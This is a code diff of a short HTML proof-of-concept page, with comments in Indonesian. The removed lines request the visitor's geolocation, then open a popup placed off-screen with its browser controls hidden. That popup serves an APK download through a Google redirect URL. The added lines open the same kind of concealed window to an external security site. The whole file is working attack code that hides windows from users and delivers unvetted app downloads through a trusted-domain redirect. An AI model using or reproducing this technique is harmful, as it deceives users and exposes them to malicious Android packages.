@@ -1,24 +1,9 @@
-<a href="#" onclick="poc()">click me</a>
-aaaa
-<script>
-async function poc() {
-  // 1) Minta lokasi dari halaman ini (localhost)
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      console.log("Lokasi OK:", pos.coords.latitude, pos.coords.longitude);
+<a href="#" onclick="poc()">popup</a>
 
-      // 2) Setelah user allow → baru buka window
-      window.open(
-        "https://www.google.com/url?q=https://rebelsec.id/sample.apk",
-        "qq",
-        "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1000,height=1000,left=-1000,top=-1000"
-      );
-    },
-    (err) => {
-      console.log("User menolak lokasi:", err);
-      // tetap boleh buka window kalau kamu mau
-      window.open("https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk");
+123
+<script>
+    function poc(){
+        window.open("https://rebelsec.id/","qq","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1000,height=1000,left=-1000,top=-1000");
+    
     }
-  );
-}
 </script>
